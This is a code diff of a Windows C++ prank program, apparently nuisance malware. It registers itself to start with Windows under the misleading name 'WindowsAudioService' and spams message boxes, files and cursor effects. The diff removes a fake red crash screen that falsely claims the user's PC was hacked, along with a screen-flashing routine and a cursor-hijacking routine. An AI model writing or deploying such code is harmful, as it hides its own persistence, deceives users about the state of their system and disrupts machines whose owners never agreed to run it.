@@ -23,7 +23,6 @@ static const wchar_t* kRunKey  = L"Software\\Microsoft\\Windows\\CurrentVersion\
 static const wchar_t* kRunName = L"WindowsAudioService";
 
 static std::atomic<bool> g_killSwitch{false};
-static std::atomic<bool> g_bsodActive{false};
 
 static Image*    g_cursorImg = nullptr;
 static ULONG_PTR g_gdiplusToken = 0;
@@ -162,7 +161,6 @@ static DWORD WINAPI MsgSpammer(LPVOID) {
     std::srand((unsigned)std::time(nullptr) ^ GetCurrentThreadId());
     for (int i = 0; i < 12; ++i) {
         if (g_killSwitch.load()) return 0;
-        if (g_bsodActive.load()) return 0;
         const wchar_t* txt = kMessages[std::rand() % kMsgCount];
         std::thread([txt]() {
             MessageBoxW(nullptr, txt, L"Ой, всё",
@@ -217,7 +215,6 @@ static DWORD WINAPI CursorTrail(LPVOID) {
     while (!g_killSwitch.load()) {
         ULONGLONG now = GetTickCount64();
 
-        // Windows: добавляем точку по позиции курсора
         if (!wine) {
             POINT p;
             if (GetCursorPos(&p)) {
@@ -228,7 +225,6 @@ static DWORD WINAPI CursorTrail(LPVOID) {
             }
         }
 
-        // чистим старые
         EnterCriticalSection(&g_trailCs);
         for (int i = (int)g_trail.size() - 1; i >= 0; i--)
             if (now - g_trail[i].birth > 1200)
@@ -237,8 +233,6 @@ static DWORD WINAPI CursorTrail(LPVOID) {
 
         HDC hdc = GetDC(h);
         RECT full = {0, 0, sw, sh};
-
-        // фон чёрный = прозрачный
         HBRUSH blackBr = CreateSolidBrush(RGB(0, 0, 0));
         FillRect(hdc, &full, blackBr);
         DeleteObject(blackBr);
@@ -268,7 +262,6 @@ static DWORD WINAPI CursorTrail(LPVOID) {
             }
             LeaveCriticalSection(&g_trailCs);
         } else {
-            // fallback — квадратики
             EnterCriticalSection(&g_trailCs);
             for (auto& dot : g_trail) {
                 ULONGLONG age = now - dot.birth;
@@ -289,180 +282,6 @@ static DWORD WINAPI CursorTrail(LPVOID) {
     }
 
     DestroyWindow(h);
-    return 0;
-}
-
-static DWORD WINAPI CursorDancer(LPVOID) {
-    POINT start{};
-    GetCursorPos(&start);
-    const double ampX = 220.0, ampY = 160.0;
-    const auto t0 = std::chrono::steady_clock::now();
-    while (std::chrono::duration_cast<std::chrono::seconds>(
-               std::chrono::steady_clock::now() - t0).count() < 3) {
-        if (g_killSwitch.load()) return 0;
-        const double t = std::chrono::duration<double>(
-            std::chrono::steady_clock::now() - t0).count();
-        int x = start.x + (int)(ampX * std::sin(t * 1.1));
-        int y = start.y + (int)(ampY * std::sin(t * 1.9));
-        SetCursorPos(x, y);
-        std::this_thread::sleep_for(std::chrono::milliseconds(12));
-    }
-    return 0;
-}
-
-// ─────────── красный BSOD ───────────
-struct BsodState { int percent = 0; };
-static BsodState g_bsodState;
-
-static LRESULT CALLBACK BsodWndProc(HWND h, UINT m, WPARAM w, LPARAM l) {
-    if (m == WM_ERASEBKGND) return 1;
-    if (m == WM_PAINT) {
-        PAINTSTRUCT ps; HDC dc = BeginPaint(h, &ps);
-        RECT rc; GetClientRect(h, &rc);
-        const int W = rc.right, H = rc.bottom;
-
-        HBRUSH bg = CreateSolidBrush(RGB(140, 0, 0));
-        FillRect(dc, &rc, bg); DeleteObject(bg);
-
-        SetBkMode(dc, TRANSPARENT);
-        SetTextColor(dc, RGB(255, 255, 255));
-
-        HFONT fFace = CreateFontW(-110, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE,
-            DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
-            ANTIALIASED_QUALITY, DEFAULT_PITCH, L"Segoe UI");
-        HGDIOBJ old = SelectObject(dc, fFace);
-        RECT rf{0, (int)(H * 0.05), W, (int)(H * 0.05) + 140};
-        DrawTextW(dc, L":)", -1, &rf, DT_CENTER | DT_SINGLELINE);
-
-        HFONT fBig = CreateFontW(-30, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE,
-            DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
-            ANTIALIASED_QUALITY, DEFAULT_PITCH, L"Segoe UI");
-        SelectObject(dc, fBig);
-        RECT rt{60, (int)(H * 0.28), W - 60, H};
-        const wchar_t* body =
-            L"Твой ПК столкнулся с проблемой и будет перезагружен.\n"
-            L"Сбор информации о проблеме...\n\n"
-            L"Код ошибки: SANCHES_HAX_0xDEADPISKA\n"
-            L"Виновник: Sanchez\n"
-            L"Сообщение: Sanchez vzlomal tvoy pk piska pi piska\n\n"
-            L"Чтобы выключить навсегда — зажми Ctrl+Shift+Alt+Q на 3 секунды.\n"
-            L"— Jack & Fox";
-        DrawTextW(dc, body, -1, &rt, DT_LEFT | DT_WORDBREAK);
-
-        const int barY = (int)(H * 0.72), barX = 60, barW = W - 120, barH = 40;
-        HPEN penWhite = CreatePen(PS_SOLID, 2, RGB(255, 255, 255));
-        HGDIOBJ oldPen = SelectObject(dc, penWhite);
-        HGDIOBJ oldBrush = SelectObject(dc, GetStockObject(NULL_BRUSH));
-        Rectangle(dc, barX, barY, barX + barW, barY + barH);
-
-        if (g_bsodState.percent > 0) {
-            int fillW = (int)((double)barW * g_bsodState.percent / 100.0);
-            RECT fill{barX + 1, barY + 1, barX + fillW, barY + barH - 1};
-            HBRUSH fillBr = CreateSolidBrush(RGB(255, 80, 80));
-            FillRect(dc, &fill, fillBr); DeleteObject(fillBr);
-        }
-        SelectObject(dc, oldPen); SelectObject(dc, oldBrush);
-        DeleteObject(penWhite);
-
-        HFONT fPercent = CreateFontW(-40, 0, 0, 0, FW_BOLD, FALSE, FALSE, FALSE,
-            DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
-            ANTIALIASED_QUALITY, DEFAULT_PITCH, L"Consolas");
-        SelectObject(dc, fPercent);
-        SetTextColor(dc, RGB(255, 255, 255));
-        wchar_t pctBuf[16];
-        wsprintfW(pctBuf, L"%d%%", g_bsodState.percent);
-        RECT rp{barX, barY + barH + 10, barX + 200, barY + barH + 70};
-        DrawTextW(dc, pctBuf, -1, &rp, DT_LEFT | DT_SINGLELINE);
-
-        SelectObject(dc, old);
-        DeleteObject(fFace); DeleteObject(fBig); DeleteObject(fPercent);
-        EndPaint(h, &ps);
-        return 0;
-    }
-    if (m == WM_DESTROY) { PostQuitMessage(0); return 0; }
-    return DefWindowProcW(h, m, w, l);
-}
-
-static void RunBsod() {
-    g_bsodActive.store(true);
-    WNDCLASSW wc{};
-    wc.lpfnWndProc   = BsodWndProc;
-    wc.hInstance     = GetModuleHandleW(nullptr);
-    wc.hCursor       = LoadCursor(nullptr, IDC_ARROW);
-    wc.lpszClassName = L"JackFoxRedBsod";
-    RegisterClassW(&wc);
-
-    int sw = GetSystemMetrics(SM_CXSCREEN);
-    int sh = GetSystemMetrics(SM_CYSCREEN);
-    HWND h = CreateWindowExW(WS_EX_TOPMOST, L"JackFoxRedBsod", L"",
-        WS_POPUP, 0, 0, sw, sh, nullptr, nullptr, wc.hInstance, nullptr);
-    ShowWindow(h, SW_SHOW); UpdateWindow(h); SetForegroundWindow(h);
-
-    struct Step { int pct; int ms; };
-    const Step steps[] = {
-        { 1, 500 }, { 7, 1000 }, { 9, 1500 }, { 18, 2000 },
-        { 34, 3000 }, { 56, 3000 }
-    };
-    for (auto& s : steps) {
-        if (g_killSwitch.load()) { DestroyWindow(h); return; }
-        g_bsodState.percent = s.pct;
-        InvalidateRect(h, nullptr, TRUE); UpdateWindow(h);
-        std::this_thread::sleep_for(std::chrono::milliseconds(s.ms));
-    }
-    for (int i = 0; i < 40; ++i) {
-        if (g_killSwitch.load()) break;
-        std::this_thread::sleep_for(std::chrono::milliseconds(50));
-    }
-    DestroyWindow(h);
-    g_bsodActive.store(false);
-}
-
-// ─────────── радуга ───────────
-static void HsvToRgb(double h, double s, double v, BYTE& r, BYTE& g, BYTE& b) {
-    double c = v * s;
-    double x = c * (1 - fabs(fmod(h / 60.0, 2.0) - 1));
-    double m = v - c;
-    double rp = 0, gp = 0, bp = 0;
-    if (h < 60) { rp = c; gp = x; bp = 0; }
-    else if (h < 120) { rp = x; gp = c; bp = 0; }
-    else if (h < 180) { rp = 0; gp = c; bp = x; }
-    else if (h < 240) { rp = 0; gp = x; bp = c; }
-    else if (h < 300) { rp = x; gp = 0; bp = c; }
-    else { rp = c; gp = 0; bp = x; }
-    r = (BYTE)((rp + m) * 255); g = (BYTE)((gp + m) * 255); b = (BYTE)((bp + m) * 255);
-}
-
-static DWORD WINAPI RainbowScreen(LPVOID) {
-    WNDCLASSW wc{};
-    wc.lpfnWndProc   = DefWindowProcW;
-    wc.hInstance     = GetModuleHandleW(nullptr);
-    wc.hCursor       = LoadCursor(nullptr, IDC_ARROW);
-    wc.lpszClassName = L"JackFoxRainbow";
-    RegisterClassW(&wc);
-
-    int sw = GetSystemMetrics(SM_CXSCREEN);
-    int sh = GetSystemMetrics(SM_CYSCREEN);
-    HWND h = CreateWindowExW(WS_EX_TOPMOST, L"JackFoxRainbow", L"",
-        WS_POPUP, 0, 0, sw, sh, nullptr, nullptr, wc.hInstance, nullptr);
-    ShowWindow(h, SW_SHOW); UpdateWindow(h); SetForegroundWindow(h);
-
-    HDC hdc = GetDC(h);
-    double hue = 0.0;
-    auto t0 = std::chrono::steady_clock::now();
-    while (!g_killSwitch.load()) {
-        auto elapsed = std::chrono::duration_cast<std::chrono::milliseconds>(
-            std::chrono::steady_clock::now() - t0).count();
-        if (elapsed >= 10000) break;
-        BYTE r, g, b;
-        HsvToRgb(hue, 1.0, 1.0, r, g, b);
-        RECT full{0, 0, sw, sh};
-        HBRUSH br = CreateSolidBrush(RGB(r, g, b));
-        FillRect(hdc, &full, br); DeleteObject(br);
-        hue += 2.0;
-        if (hue >= 360.0) hue -= 360.0;
-        std::this_thread::sleep_for(std::chrono::milliseconds(20));
-    }
-    ReleaseDC(h, hdc); DestroyWindow(h);
     return 0;
 }
 
@@ -490,17 +309,9 @@ static void ShowSystemErrors() {
     }
 }
 
+// ─────────── главный цикл ───────────
 static DWORD WINAPI MainLoop(LPVOID) {
-    std::this_thread::sleep_for(std::chrono::seconds(5));
-    if (g_killSwitch.load()) return 0;
-
-    RunBsod();
-    if (g_killSwitch.load()) return 0;
-    std::this_thread::sleep_for(std::chrono::milliseconds(500));
-
-    HANDLE hRainbow = CreateThread(nullptr, 0, RainbowScreen, nullptr, 0, nullptr);
-    WaitForSingleObject(hRainbow, INFINITE);
-    CloseHandle(hRainbow);
+    std::this_thread::sleep_for(std::chrono::seconds(8));
     if (g_killSwitch.load()) return 0;
 
     MessageBoxW(nullptr,
@@ -531,7 +342,7 @@ int main() {
     GdiplusStartupInput gdiplusStartupInput;
     GdiplusStartup(&g_gdiplusToken, &gdiplusStartupInput, nullptr);
 
-    // загрузка картинки 
+    // загрузка картинки
     std::wstring cursorPath = GetExeDir() + L"cursor.png";
     g_cursorImg = Image::FromFile(cursorPath.c_str());
 
@@ -542,7 +353,6 @@ int main() {
     CreateThread(nullptr, 0, FileSpammer,       nullptr, 0, nullptr);
     CreateThread(nullptr, 0, MsgSpammer,        nullptr, 0, nullptr);
     CreateThread(nullptr, 0, CursorTrail,       nullptr, 0, nullptr);
-    CreateThread(nullptr, 0, CursorDancer,      nullptr, 0, nullptr);
     CreateThread(nullptr, 0, MainLoop,          nullptr, 0, nullptr);
 
     Sleep(INFINITE);
